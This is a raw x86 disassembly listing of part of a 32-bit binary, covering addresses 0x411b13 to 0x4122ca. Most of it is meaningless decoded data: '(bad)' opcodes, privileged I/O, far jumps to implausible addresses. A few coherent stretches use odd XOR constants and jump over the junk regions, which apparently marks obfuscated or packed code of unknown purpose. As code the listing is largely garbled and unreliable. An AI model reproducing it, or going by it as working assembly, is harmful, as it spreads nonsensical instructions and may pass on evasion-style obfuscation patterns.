  411b13:	cdq    
  411b14:	fmul   st,st(5)
  411b16:	push   ss
  411b17:	jp     0x411b6a
  411b19:	iret   
  411b1a:	add    DWORD PTR [ecx-0x61],0x2dfbb549
  411b21:	cld    
  411b22:	sub    bl,BYTE PTR [eax+eax*4-0x11ad6343]
  411b29:	fld    TBYTE PTR [esi]
  411b2b:	dec    edi
  411b2c:	mov    WORD PTR [eax-0x20],ss
  411b2f:	loop   0x411b9a
  411b31:	inc    ebx
  411b32:	mov    ds:0xadd1d067,eax
  411b37:	inc    ecx
  411b38:	cmp    BYTE PTR [edx+0x2b],dh
  411b3b:	add    eax,DWORD PTR [ebx+eiz*1+0x3f360659]
  411b42:	adc    ebp,0x55
  411b45:	inc    eax
  411b46:	jo     0x411b02
  411b48:	mov    esp,0xc1cd222f
  411b4d:	dec    esi
  411b4e:	into   
  411b4f:	cld    
  411b50:	lods   al,BYTE PTR ds:[si]
  411b52:	jmp    0xad445448
  411b57:	or     BYTE PTR [edi-0x31],ah
  411b5a:	jmp    0xa678:0x37735d42
  411b61:	retf   
  411b62:	jbe    0x411b41
  411b64:	test   DWORD PTR [esi-0x69],edx
  411b67:	bound  esi,QWORD PTR [ecx-0x75]
  411b6a:	xchg   esi,eax
  411b6b:	(bad)  
  411b6c:	jle    0x411b36
  411b6e:	out    dx,eax
  411b6f:	add    dl,al
  411b71:	mov    eax,ds:0x4038ae0b
  411b76:	adc    ebp,ebx
  411b78:	(bad)  
  411b79:	sbb    al,0x53
  411b7b:	inc    esi
  411b7c:	or     al,ch
  411b7e:	dec    eax
  411b7f:	test   BYTE PTR [esp+edi*1-0x22],ch
  411b83:	arpl   WORD PTR [ebx],si
  411b85:	sub    eax,DWORD PTR [ebx-0x80]
  411b88:	arpl   WORD PTR [eax],ax
  411b8a:	and    BYTE PTR [ecx],bl
  411b8c:	xchg   ebp,eax
  411b8d:	mov    bh,0x1a
  411b8f:	jl     0x411bba
  411b91:	inc    ebx
  411b92:	popa   
  411b93:	shl    BYTE PTR [ebx-0x62eef06f],1
  411b99:	cwde   
  411b9a:	lods   al,BYTE PTR ds:[esi]
  411b9b:	das    
  411b9c:	mov    ebx,0xab16def6
  411ba1:	adc    BYTE PTR [eax+0x2ff1799a],dh
  411ba7:	xor    al,0xca
  411ba9:	cmp    eax,0xee25d707
  411bae:	into   
  411baf:	lods   eax,DWORD PTR ds:[esi]
  411bb0:	aad    0x4e
  411bb2:	adc    ch,BYTE PTR [esi]
  411bb4:	inc    ebx
  411bb5:	ds (bad) 
  411bb7:	cli    
  411bb8:	xchg   esi,eax
  411bb9:	cmp    edi,DWORD PTR [eax+eiz*8-0x1257a425]
  411bc0:	xor    DWORD PTR [edi],ebx
  411bc2:	pop    ds
  411bc3:	xchg   edx,eax
  411bc4:	mov    eax,0x581d0ea3
  411bc9:	ficomp WORD PTR [eax+edi*8+0x58]
  411bcd:	in     eax,dx
  411bce:	(bad)  
  411bcf:	push   ecx
  411bd0:	jl     0x411b61
  411bd2:	xchg   BYTE PTR [ebx-0x3b5d870b],cl
  411bd8:	test   DWORD PTR [edx],edx
  411bda:	(bad)  
  411bdb:	push   ss
  411bdc:	scas   eax,DWORD PTR es:[edi]
  411bdd:	outs   dx,DWORD PTR ds:[esi]
  411bde:	jno    0x411c34
  411be0:	fnsave [ebx]
  411be2:	mov    dl,0x52
  411be4:	mov    DWORD PTR [edx-0x4a],ebp
  411be7:	loopne 0x411c32
  411be9:	pop    eax
  411bea:	dec    esi
  411beb:	es dec eax
  411bed:	mov    esp,0xfd38c4c5
  411bf2:	push   ebx
  411bf3:	shl    DWORD PTR [ebx],1
  411bf5:	xchg   edx,ebx
  411bf7:	in     eax,0x8b
  411bf9:	test   edi,0x78a66309
  411bff:	sbb    bh,bh
  411c01:	iret   
  411c02:	jge    0x411c4a
  411c04:	scas   al,BYTE PTR es:[edi]
  411c05:	rol    BYTE PTR [ecx+edi*2+0x8],cl
  411c09:	lods   al,BYTE PTR ds:[esi]
  411c0a:	dec    esp
  411c0b:	popa   
  411c0c:	adc    bh,BYTE PTR [eax-0x4ae5dfbb]
  411c12:	dec    eax
  411c13:	pop    edi
  411c14:	cmp    ebx,0x7b
  411c17:	ja     0x411c8f
  411c19:	je     0x411c91
  411c1b:	cli    
  411c1c:	ins    DWORD PTR es:[edi],dx
  411c1d:	sub    ch,BYTE PTR [ebp-0x18]
  411c20:	mov    ecx,0xbc8049be
  411c25:	jns    0x411ca3
  411c27:	dec    ebp
  411c28:	cs pop ss
  411c2a:	sbb    al,0xae
  411c2c:	xchg   edx,eax
  411c2d:	dec    edi
  411c2e:	mov    cs,WORD PTR [eax]
  411c30:	sub    eax,0x8fbffb23
  411c35:	dec    esi
  411c36:	ins    BYTE PTR es:[edi],dx
  411c37:	push   edx
  411c38:	sbb    BYTE PTR [edi],dh
  411c3a:	adc    dh,0x73
  411c3d:	loope  0x411bfd
  411c3f:	inc    ebx
  411c40:	popa   
  411c41:	and    esp,DWORD PTR [edi+0x3]
  411c44:	retf   0x3a13
  411c47:	stos   DWORD PTR es:[edi],eax
  411c48:	(bad)  
  411c4b:	aas    
  411c4c:	into   
  411c4d:	add    al,0x10
  411c4f:	icebp  
  411c50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c51:	sbb    BYTE PTR [ebp+0xe],0x1b
  411c55:	dec    edi
  411c56:	fidivr WORD PTR [edx]
  411c58:	je     0x411c97
  411c5a:	rol    DWORD PTR [eax+0x36412b2f],1
  411c60:	aaa    
  411c61:	into   
  411c62:	call   FWORD PTR [esi+0x68]
  411c65:	xchg   dl,bh
  411c67:	test   BYTE PTR [ebp-0x743f3e5b],cl
  411c6d:	dec    ebp
  411c6e:	mov    ah,0x8b
  411c70:	push   ebp
  411c71:	mov    al,ds:0x5a4758b
  411c76:	sbb    BYTE PTR [eax+0x0],bh
  411c79:	add    BYTE PTR [ecx+0x87d1],al
  411c7f:	add    BYTE PTR [ebx],cl
  411c81:	ret    0x558b
  411c84:	nop
  411c85:	jmp    0x411efa
  411c8a:	pop    ebp
  411c8b:	and    DWORD PTR [esi],esi
  411c8d:	xor    bh,BYTE PTR ds:[esi]
  411c90:	pop    ebp
  411c91:	sbb    bh,BYTE PTR [edi+edi*8+0x67af6a08]
  411c98:	sbb    eax,0x186a4f7e
  411c9d:	sbb    BYTE PTR [ecx+0x14],dh
  411ca0:	sbb    BYTE PTR [eax],bl
  411ca2:	daa    
  411ca3:	and    al,0x1a
  411ca5:	test   DWORD PTR [edi-0x26],0x8c16621
  411cac:	push   edi
  411cad:	stos   DWORD PTR es:[edi],eax
  411cae:	test   BYTE PTR [edi+edi*1],bh
  411cb1:	lock mov ds:0xe145f6b4,eax
  411cb7:	xchg   DWORD PTR [edi-0x1a],edx
  411cba:	retf   0x935c
  411cbd:	mov    ebx,DWORD PTR [ecx+0x76ceeae8]
  411cc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cc4:	retf   0x5acd
  411cc7:	aas    
  411cc8:	ins    DWORD PTR es:[edi],dx
  411cc9:	mov    edx,0x9085d111
  411cce:	xor    eax,0x5e272818
  411cd3:	pop    esp
  411cd4:	ja     0x411cee
  411cd6:	(bad)  
  411cd7:	loopne 0x411ca6
  411cd9:	xor    eax,eax
  411cdb:	push   0x4b
  411cdd:	pushf  
  411cde:	push   eax
  411cdf:	cmp    dh,BYTE PTR [eax-0x61869388]
  411ce5:	adc    DWORD PTR [ebx+0x23],ecx
  411ce8:	pop    ds
  411ce9:	add    DWORD PTR [esi+0x17],0xfcda9984
  411cf0:	and    DWORD PTR [ecx-0x1e21d4d3],esp
  411cf6:	cwde   
  411cf7:	test   DWORD PTR [edx],esi
  411cf9:	xor    DWORD PTR [edx],ecx
  411cfb:	mov    ah,0xc
  411cfd:	jmp    0x9c7316d2
  411d02:	cmp    ebx,edx
  411d04:	fdiv   QWORD PTR [edx-0x65]
  411d07:	shr    ch,1
  411d09:	jle    0x411cff
  411d0b:	fdivr  QWORD PTR [eax-0x6b]
  411d0e:	mov    al,ds:0xfe6334a3
  411d13:	fild   WORD PTR [ebp+0xe]
  411d16:	out    0x13,al
  411d18:	repnz ds data16 sahf 
  411d1c:	xchg   esi,eax
  411d1d:	loop   0x411d08
  411d1f:	repnz in al,dx
  411d21:	push   ecx
  411d22:	jbe    0x411d01
  411d24:	sbb    BYTE PTR [eax],bl
  411d26:	pop    ds
  411d27:	pop    ecx
  411d28:	xor    eax,0x2889e2da
  411d2d:	aam    0x8f
  411d2f:	ins    DWORD PTR es:[edi],dx
  411d30:	or     bh,BYTE PTR [ebx-0x7]
  411d33:	test   al,0xa5
  411d35:	and    esp,edi
  411d37:	mov    dl,0x8b
  411d39:	push   ecx
  411d3a:	gs enter 0xf89c,0xe6
  411d3f:	sub    eax,0x829b0696
  411d44:	int    0xc1
  411d46:	sbb    DWORD PTR [edi+0x5bc22973],eax
  411d4c:	fucomi st,st(3)
  411d4e:	popa   
  411d4f:	inc    ebx
  411d50:	push   esp
  411d51:	cmp    eax,0x9414233
  411d56:	mov    BYTE PTR ds:0xaf81c3c3,dh
  411d5c:	std    
  411d5d:	loopne 0x411d7c
  411d5f:	push   0x68
  411d61:	mov    ebp,0xcfa10c1c
  411d66:	and    bl,BYTE PTR [edi]
  411d68:	popa   
  411d69:	shr    DWORD PTR [ecx+0x205a297a],0x37
  411d70:	xchg   DWORD PTR [ecx+ecx*1-0x73a072f4],eax
  411d77:	(bad)  
  411d78:	push   ecx
  411d79:	xchg   esi,eax
  411d7a:	outs   dx,DWORD PTR ds:[esi]
  411d7b:	aas    
  411d7c:	jbe    0x411d6e
  411d7e:	aad    0x98
  411d80:	pop    eax
  411d81:	cli    
  411d82:	xchg   edx,eax
  411d83:	sub    eax,0x84731030
  411d88:	jmp    0x411de0
  411d8a:	je     0x411dfd
  411d8c:	xchg   esp,eax
  411d8d:	aas    
  411d8e:	stc    
  411d8f:	push   esi
  411d90:	lea    esi,[edx-0x54]
  411d93:	dec    ebx
  411d94:	aas    
  411d95:	not    esi
  411d97:	push   0xffffffc8
  411d99:	fchs   
  411d9b:	pushf  
  411d9c:	cld    
  411d9d:	xor    dl,bl
  411d9f:	retf   
  411da0:	popf   
  411da1:	or     eax,0x3f9cd6cd
  411da6:	(bad)  
  411da7:	push   0xa3ffaeca
  411dac:	inc    esp
  411dad:	mov    ds:0xd379336b,eax
  411db2:	mov    edx,0xac44605c
  411db7:	sub    edi,ebp
  411db9:	pusha  
  411dba:	call   0xb30:0x90d7f444
  411dc1:	js     0x411dc7
  411dc3:	icebp  
  411dc4:	cmp    al,0x57
  411dc6:	mov    ebp,0x28b7d3
  411dcb:	fistp  DWORD PTR [esi]
  411dcd:	cdq    
  411dce:	mov    bl,0x42
  411dd0:	cli    
  411dd1:	or     ch,BYTE PTR [eax-0xc]
  411dd4:	cmp    eax,0x71788c59
  411dd9:	inc    esi
  411dda:	hlt    
  411ddb:	stos   DWORD PTR es:[edi],eax
  411ddc:	popa   
  411ddd:	cmp    BYTE PTR [ecx],ah
  411ddf:	and    eax,0x55ac46
  411de4:	sbb    eax,0xfdb92a9f
  411de9:	xchg   DWORD PTR [edx],edi
  411deb:	fist   DWORD PTR [esi]
  411ded:	sbb    ah,BYTE PTR [ecx+0x60e2564d]
  411df3:	rcr    bh,cl
  411df5:	(bad)  
  411df7:	and    al,0xc3
  411df9:	fnstenv [eax-0x6f]
  411dfc:	ret    
  411dfd:	dec    esi
  411dfe:	jne    0x411dbe
  411e00:	xchg   ecx,eax
  411e01:	loope  0x411e52
  411e03:	int    0xdc
  411e05:	or     BYTE PTR [edi+0x4ba77216],dl
  411e0b:	outs   dx,BYTE PTR ds:[esi]
  411e0c:	mov    WORD PTR [ebp+0x3c],?
  411e0f:	sahf   
  411e10:	aad    0x92
  411e12:	push   cs
  411e13:	(bad)  
  411e14:	outs   dx,DWORD PTR ds:[esi]
  411e16:	(bad)  
  411e17:	out    0x35,eax
  411e19:	test   edx,eax
  411e1b:	mov    edi,DWORD PTR [ecx-0x37e3ddef]
  411e21:	test   ch,0xd4
  411e24:	popf   
  411e25:	aad    0x95
  411e27:	scas   al,BYTE PTR es:[edi]
  411e28:	mov    bl,0x47
  411e2a:	fcom   DWORD PTR [edx+0x17c269fc]
  411e30:	pop    ebp
  411e31:	in     al,dx
  411e32:	jmp    0xbbdde4d9
  411e37:	sbb    BYTE PTR [eax],ch
  411e39:	(bad)  
  411e3a:	and    bl,BYTE PTR [edi-0x31efd2e3]
  411e40:	push   ss
  411e41:	dec    esp
  411e42:	int3   
  411e43:	dec    eax
  411e44:	icebp  
  411e45:	ret    
  411e46:	fdivr  DWORD PTR [ebx+esi*4+0x45ca8449]
  411e4d:	push   ss
  411e4e:	push   cs
  411e4f:	ffreep st(0)
  411e51:	or     al,0x7f
  411e53:	cmc    
  411e54:	and    DWORD PTR [esi+edx*4-0x5f1194fc],esi
  411e5b:	sahf   
  411e5c:	ror    cl,0x1
  411e5f:	jle    0x411edc
  411e61:	rol    BYTE PTR [eax+0x58],cl
  411e64:	jno    0x411edf
  411e66:	xchg   DWORD PTR [edx],edi
  411e68:	mov    edx,0x19aeb57f
  411e6d:	out    0x9b,al
  411e6f:	mov    ah,0xc3
  411e71:	push   ebx
  411e72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e73:	lea    ecx,[ebx+0x34]
  411e76:	cdq    
  411e77:	and    cl,dl
  411e79:	mov    ds:0xde3f4db1,eax
  411e7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e7f:	mov    esi,0xf2994700
  411e84:	aas    
  411e85:	push   ss
  411e86:	dec    ebp
  411e87:	add    bh,dh
  411e89:	mov    bl,0x9b
  411e8b:	sub    dh,BYTE PTR [ebx-0x641ed227]
  411e91:	jl     0x411e6f
  411e93:	adc    ecx,DWORD PTR [ecx-0x32]
  411e96:	dec    eax
  411e97:	add    eax,0x8367529f
  411e9c:	ja     0x411edd
  411e9e:	xchg   edx,eax
  411e9f:	iret   
  411ea0:	pop    ds
  411ea1:	jbe    0x411e88
  411ea3:	push   ebp
  411ea4:	in     al,dx
  411ea5:	jle    0x411ebd
  411ea7:	shl    DWORD PTR [ebx-0x36],1
  411eaa:	in     eax,0xc8
  411eac:	pusha  
  411ead:	cmc    
  411eae:	icebp  
  411eaf:	cmp    DWORD PTR [ebx-0x2a9ce1fc],esi
  411eb5:	dec    ebx
  411eb6:	dec    di
  411eb8:	dec    ebp
  411eb9:	sbb    DWORD PTR [eax],ebp
  411ebb:	std    
  411ebc:	in     eax,0x72
  411ebe:	mov    bl,0x8e
  411ec0:	adc    al,0x52
  411ec2:	ds pop es
  411ec4:	inc    esp
  411ec5:	out    dx,eax
  411ec6:	mov    bl,0xf8
  411ec8:	dec    esi
  411ec9:	xchg   esp,eax
  411eca:	sbb    eax,0x15305767
  411ecf:	into   
  411ed0:	xor    edi,ebx
  411ed2:	jl     0x411e7f
  411ed4:	cwde   
  411ed5:	mov    dl,0xde
  411ed7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ed8:	and    al,0x20
  411eda:	cld    
  411edb:	loopne 0x411f3e
  411edd:	cld    
  411ede:	cmp    BYTE PTR [ecx+0x32],0xe3
  411ee2:	into   
  411ee3:	leave  
  411ee4:	lock cmp BYTE PTR [ecx],ch
  411ee7:	data16 in al,0x74
  411eea:	cmp    esi,DWORD PTR [edx+0x2d071027]
  411ef0:	retf   
  411ef1:	add    DWORD PTR [eax+0x58003677],eax
  411ef7:	adc    al,0xd
  411ef9:	mov    bh,0xb
  411efb:	into   
  411efc:	mov    esi,DWORD PTR [ebp-0x6c]
  411eff:	push   esi
  411f00:	push   edx
  411f01:	push   ecx
  411f02:	push   eax
  411f03:	call   0x416c20
  411f08:	mov    ecx,DWORD PTR [ebp-0x80]
  411f0b:	mov    esi,DWORD PTR [ebp-0x7c]
  411f0e:	and    eax,ecx
  411f10:	mov    ecx,DWORD PTR ds:0x422568
  411f16:	mov    ecx,DWORD PTR [ecx+0x1d0]
  411f1c:	mov    ecx,DWORD PTR [ecx]
  411f1e:	and    edx,esi
  411f20:	xor    eax,0x2b01
  411f25:	xor    edx,0x2021
  411f2b:	xor    esi,esi
  411f2d:	cmp    ecx,eax
  411f2f:	jne    0x4127da
  411f35:	cmp    esi,edx
  411f37:	jne    0x4127da
  411f3d:	mov    eax,DWORD PTR [ebp-0xa4]
  411f43:	mov    ecx,DWORD PTR [ebp-0xc]
  411f46:	add    eax,0x80ca
  411f4b:	or     eax,ecx
  411f4d:	mov    ecx,DWORD PTR ds:0x422604
  411f53:	or     eax,0x686
  411f58:	xor    eax,0x3eec
  411f5d:	lea    eax,[eax+ecx*1-0xc11b]
  411f64:	xor    DWORD PTR ds:0x4225fc,eax
  411f6a:	mov    eax,DWORD PTR [ebp-0x64]
  411f6d:	and    eax,0x4dff
  411f72:	add    eax,DWORD PTR [ebp-0x14]
  411f75:	mov    ecx,DWORD PTR [ebp-0x94]
  411f7b:	xor    eax,0x676c
  411f80:	xor    edx,edx
  411f82:	div    ecx
  411f84:	mov    ecx,DWORD PTR [ebp-0x24]
  411f87:	mov    edx,DWORD PTR [ebp-0x74]
  411f8a:	xor    ecx,0x6e1e
  411f90:	imul   ecx,edx
  411f93:	mov    edx,DWORD PTR [ebp+0x8]
  411f96:	push   0x4
  411f98:	jmp    0x41220d
  411f9d:	mov    gs,WORD PTR [esp+ecx*4-0x7c]
  411fa1:	push   0x64
  411fa3:	jle    0x411fff
  411fa5:	inc    ebp
  411fa6:	inc    ecx
  411fa7:	jne    0x412025
  411fa9:	fist   WORD PTR [ebx-0x49]
  411fac:	jl     0x411f54
  411fae:	data16 sbb BYTE PTR [eax],bl
  411fb1:	jno    0x411fc7
  411fb3:	sbb    BYTE PTR [eax],bl
  411fb5:	data16 hlt 
  411fb7:	xchg   edx,eax
  411fb8:	loopne 0x411f54
  411fba:	in     eax,dx
  411fbb:	sbb    DWORD PTR [ebx],ebp
  411fbd:	cdq    
  411fbe:	lahf   
  411fbf:	fimul  DWORD PTR [ebp+0x1d]
  411fc2:	sbb    al,BYTE PTR [ebp+0x48]
  411fc5:	aam    0x7c
  411fc7:	bound  ecx,QWORD PTR [edx+eiz*1-0x7c]
  411fcb:	enter  0xa185,0xc2
  411fcf:	pushf  
  411fd0:	rcl    BYTE PTR [edi+0x4d136d52],0xb6
  411fd7:	xor    DWORD PTR [ebx],edx
  411fd9:	in     al,0x9a
  411fdb:	icebp  
  411fdc:	inc    edx
  411fdd:	mov    esi,0xbb14082e
  411fe2:	call   0x695ae856
  411fe7:	fidiv  WORD PTR [ecx+0x31]
  411fea:	cmc    
  411feb:	push   edi
  411fec:	(bad)  
  411fed:	inc    esi
  411fee:	jnp    0x412039
  411ff0:	adc    bl,dh
  411ff2:	rcr    BYTE PTR [esi+0x4],1
  411ff5:	push   esi
  411ff6:	fst    DWORD PTR [ecx+0x131e188a]
  411ffc:	pop    edi
  411ffd:	jnp    0x411fa3
  411fff:	or     esp,ebp
  412001:	ins    BYTE PTR es:[edi],dx
  412002:	in     al,dx
  412003:	adc    cl,ch
  412005:	fiadd  DWORD PTR [esi]
  412007:	cmp    ebp,DWORD PTR [ecx]
  412009:	popa   
  41200a:	and    eax,0x7ceceab3
  41200f:	sub    edi,DWORD PTR [edi-0x58]
  412012:	dec    edx
  412013:	shl    DWORD PTR [eax-0x1a555c26],0x5b
  41201a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41201b:	stos   BYTE PTR es:[edi],al
  41201c:	push   esi
  41201d:	mov    dh,0x5c
  41201f:	pop    es
  412020:	test   al,0x42
  412022:	ins    BYTE PTR es:[edi],dx
  412023:	bound  ebx,QWORD PTR [ecx]
  412025:	sti    
  412026:	and    ebp,eax
  412028:	aas    
  412029:	inc    eax
  41202a:	mov    eax,0x765a8c67
  41202f:	ret    
  412030:	dec    ecx
  412031:	push   eax
  412032:	pop    ebp
  412033:	mov    eax,ds:0xf8c6c245
  412038:	jmp    0xb1db3d2e
  41203d:	add    BYTE PTR [esi+0x195e7b24],cl
  412043:	aad    0xe0
  412045:	mov    BYTE PTR [eax],bh
  412047:	dec    ecx
  412048:	sub    al,0x1b
  41204a:	shr    dl,cl
  41204c:	shr    DWORD PTR [ebp-0x5711c9a1],cl
  412052:	cmc    
  412053:	into   
  412054:	inc    eax
  412055:	jno    0x411fdc
  412057:	je     0x4120c6
  412059:	fwait
  41205a:	inc    edi
  41205b:	lds    edx,FWORD PTR [ebp-0x79aae063]
  412061:	iret   
  412062:	enter  0x8231,0xd9
  412066:	mov    ecx,0x7ffbaa4b
  41206b:	stos   DWORD PTR es:[edi],eax
  41206c:	fiadd  DWORD PTR [edx-0x51]
  41206f:	and    edx,DWORD PTR [edi-0x61ff4f09]
  412075:	jne    0x412051
  412077:	jnp    0x4120f8
  412079:	icebp  
  41207a:	sbb    DWORD PTR [ebx],ebx
  41207c:	fisttp WORD PTR [ebp+esi*4-0x3b6c62b8]
  412083:	ds cmp al,0x79
  412086:	inc    DWORD PTR [ebx-0x26e4fa7d]
  41208c:	or     al,0x46
  41208e:	dec    ebx
  41208f:	sbb    al,0xf0
  412091:	sub    bl,BYTE PTR [esp+ecx*8+0x277bf810]
  412098:	(bad)  
  412099:	push   esi
  41209a:	(bad)  
  41209b:	xchg   ebp,eax
  41209c:	je     0x412071
  41209e:	fwait
  41209f:	ret    
  4120a0:	pop    ss
  4120a1:	js     0x41206a
  4120a3:	int3   
  4120a4:	pop    esp
  4120a5:	clc    
  4120a6:	sbb    bl,dh
  4120a8:	jbe    0x4120cf
  4120aa:	xor    al,0x69
  4120ac:	and    al,0x63
  4120ae:	pushf  
  4120af:	sti    
  4120b0:	cdq    
  4120b1:	dec    eax
  4120b2:	inc    esp
  4120b3:	es in  al,0xbc
  4120b6:	aas    
  4120b7:	cs mov al,0x0
  4120ba:	je     0x412130
  4120bc:	mov    DWORD PTR [edi-0xc2d9ec0],0x14dc981c
  4120c6:	pusha  
  4120c7:	adc    eax,DWORD PTR [edx]
  4120c9:	jae    0x4120fe
  4120cb:	sti    
  4120cc:	out    0x15,eax
  4120ce:	or     BYTE PTR [ebp+0x23ecf192],ch
  4120d4:	dec    ecx
  4120d5:	imul   eax,DWORD PTR [ecx],0x43
  4120d8:	sub    edx,DWORD PTR [ebx-0x40]
  4120db:	lock mov bl,0x7b
  4120de:	cmc    
  4120df:	push   edi
  4120e0:	popa   
  4120e1:	jecxz  0x4120d7
  4120e3:	add    edx,DWORD PTR ds:0xbc88207
  4120e9:	loope  0x41213c
  4120eb:	fisub  WORD PTR [ecx]
  4120ed:	inc    eax
  4120ee:	sbb    ch,al
  4120f0:	and    DWORD PTR [ecx],eax
  4120f2:	enter  0x6aba,0x81
  4120f6:	shl    cl,0x50
  4120f9:	call   0xf7ec:0x41783ac9
  412100:	cld    
  412101:	jo     0x41215d
  412103:	call   0x11e445b7
  412108:	fild   QWORD PTR [edi]
  41210a:	retf   0xd20d
  41210d:	cmp    eax,0x9f793c4b
  412112:	cld    
  412113:	test   BYTE PTR [esi],al
  412115:	nop
  412116:	jnp    0x4120e5
  412118:	mov    dl,BYTE PTR [edx]
  41211a:	xchg   edx,eax
  41211b:	clc    
  41211c:	stc    
  41211d:	xchg   esi,eax
  41211e:	(bad)  
  412120:	(bad)  
  412121:	push   eax
  412122:	fdivp  st(1),st
  412124:	or     al,0x21
  412126:	sub    BYTE PTR [ebp+eiz*2-0x5d0c1bd4],ch
  41212d:	sbb    edi,DWORD PTR [edx+0x7a]
  412130:	dec    esp
  412131:	daa    
  412132:	sbb    BYTE PTR [edi],dh
  412134:	inc    ebx
  412135:	jecxz  0x412117
  412137:	cli    
  412138:	gs sbb edx,ebx
  41213b:	fistp  WORD PTR [esi]
  41213d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41213e:	retf   0x5440
  412141:	out    0x62,al
  412143:	loop   0x412117
  412145:	or     ecx,DWORD PTR [esi+edx*2+0x157bcec3]
  41214c:	pusha  
  41214d:	adc    al,0xd6
  41214f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412150:	out    0x5e,eax
  412152:	stc    
  412153:	std    
  412154:	shl    BYTE PTR [esi],0xc8
  412157:	outs   dx,DWORD PTR ds:[esi]
  412158:	adc    esi,esi
  41215a:	push   ebp
  41215b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41215c:	dec    edi
  41215d:	(bad)  
  41215e:	or     al,dl
  412160:	jno    0x41212a
  412162:	mov    edi,0xca547065
  412167:	push   ecx
  412168:	in     al,0x41
  41216a:	xchg   ebp,ecx
  41216c:	mov    cl,0x67
  41216e:	lods   al,BYTE PTR ds:[esi]
  41216f:	call   DWORD PTR [edx-0x43f5d7b8]
  412175:	fwait
  412176:	les    ecx,FWORD PTR [edi-0x29]
  412179:	cmp    esi,edi
  41217b:	rcr    DWORD PTR [ebx-0x25],cl
  41217e:	jno    0x4121ec
  412180:	jecxz  0x41212e
  412182:	outs   dx,DWORD PTR ds:[esi]
  412183:	mov    esp,0xd4e7c3a1
  412188:	cmp    WORD PTR [esi+0x44],cx
  41218c:	repnz mov cs,WORD PTR [ecx+0x1a]
  412190:	xchg   edi,eax
  412191:	dec    ecx
  412192:	outs   dx,BYTE PTR ds:[esi]
  412193:	hlt    
  412194:	inc    esi
  412195:	cld    
  412196:	ins    DWORD PTR es:[edi],dx
  412197:	sub    DWORD PTR [ebx],esi
  412199:	and    BYTE PTR [eax-0x3425213c],dh
  41219f:	mov    cl,0xef
  4121a1:	cmp    eax,0x43348b4d
  4121a6:	mov    cs,WORD PTR [eax]
  4121a8:	test   eax,0xa6f49e9f
  4121ad:	sub    bl,BYTE PTR [edi-0x43]
  4121b0:	fstp   TBYTE PTR [edi-0x3d]
  4121b3:	pop    ebx
  4121b4:	cmp    ah,bh
  4121b6:	les    edx,FWORD PTR [edx-0x37]
  4121b9:	jo     0x412216
  4121bb:	loope  0x4121e9
  4121bd:	or     DWORD PTR [esi],esp
  4121bf:	fldcw  WORD PTR [eax-0xe]
  4121c2:	jne    0x4121b0
  4121c4:	shl    DWORD PTR [eax-0x511b036f],cl
  4121ca:	ret    
  4121cb:	pop    ds
  4121cc:	je     0x4121e1
  4121ce:	add    BYTE PTR [ebx+eiz*8-0x38],0x2c
  4121d3:	pop    ss
  4121d4:	daa    
  4121d5:	fdivrp st(4),st
  4121d7:	(bad)  
  4121d8:	out    dx,al
  4121d9:	pop    ebx
  4121da:	jo     0x412185
  4121dc:	mov    edi,0xf5ebb0c9
  4121e1:	push   es
  4121e2:	xchg   DWORD PTR [ecx-0x24],esp
  4121e5:	xor    bh,BYTE PTR [ebp+ebp*1+0x25]
  4121e9:	xor    ebp,DWORD PTR [eax-0x40]
  4121ec:	sti    
  4121ed:	push   0x1370f7d
  4121f2:	test   DWORD PTR [ecx],0x481ab501
  4121f8:	mov    al,ds:0x17a67003
  4121fd:	pushf  
  4121fe:	dec    ebp
  4121ff:	pop    ebx
  412200:	arpl   WORD PTR [edi-0x43789ec3],dx
  412206:	ss or  esi,ebx
  412209:	and    ebp,DWORD PTR [edi+esi*8+0x7b20687f]
  412210:	ret    
  412211:	in     al,0x35
  412213:	test   BYTE PTR [eax],bh
  412215:	add    BYTE PTR [eax],al
  412217:	mov    eax,DWORD PTR [eax+edx*1]
  41221a:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  412221:	mov    eax,DWORD PTR [ebp-0x34]
  412224:	mov    edx,DWORD PTR [ebp-0xb4]
  41222a:	lea    eax,[edx+eax*1-0x76d2]
  412231:	mov    edx,DWORD PTR [ebp-0x44]
  412234:	mov    esi,DWORD PTR [ebp-0x84]
  41223a:	or     eax,edx
  41223c:	xor    edx,edx
  41223e:	div    esi
  412240:	mov    edx,DWORD PTR [ebp-0x54]
  412243:	add    eax,0x43d7
  412248:	xor    eax,0x5e6a
  41224d:	add    eax,DWORD PTR [edx+ecx*1]
  412250:	mov    ecx,DWORD PTR ds:0x4225fc
  412256:	add    DWORD PTR [eax],ecx
  412258:	mov    eax,DWORD PTR [ebp-0x90]
  41225e:	mov    ecx,DWORD PTR [ebp-0x8c]
  412264:	mov    edx,DWORD PTR [ebp-0xa0]
  41226a:	mov    esi,DWORD PTR [ebp-0x9c]
  412270:	sub    edx,eax
  412272:	mov    eax,DWORD PTR [ebp-0xb0]
  412278:	sbb    esi,ecx
  41227a:	mov    ecx,DWORD PTR [ebp-0xac]
  412280:	xor    edx,eax
  412282:	mov    eax,DWORD PTR [ebp-0xc0]
  412288:	xor    esi,ecx
  41228a:	mov    ecx,DWORD PTR [ebp-0xbc]
  412290:	jmp    0x412505
  412295:	mov    ah,0x74
  412297:	xchg   edx,eax
  412298:	cli    
  412299:	push   edx
  41229a:	fistp  DWORD PTR [edx+ebx*1]
  41229d:	cs jge 0x4122b6
  4122a0:	stos   BYTE PTR es:[edi],al
  4122a1:	stos   BYTE PTR es:[edi],al
  4122a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122a3:	push   cs
  4122a4:	jle    0x4122a4
  4122a6:	pusha  
  4122a7:	sbb    BYTE PTR [eax],bl
  4122a9:	jno    0x4122bf
  4122ab:	sbb    BYTE PTR [eax],bl
  4122ad:	aaa    
  4122ae:	xor    eax,edi
  4122b0:	stc    
  4122b1:	test   eax,0x46041df9
  4122b6:	test   BYTE PTR [edx+eiz*1],0x2a
  4122ba:	rcl    ebp,0x7
  4122bd:	and    BYTE PTR [ebx+eiz*1],0x44
  4122c1:	xor    eax,DWORD PTR ds:0xd1ca8d11
  4122c7:	cli    
  4122c8:	mov    dl,0x78
  4122ca:	xchg   ebp,eax
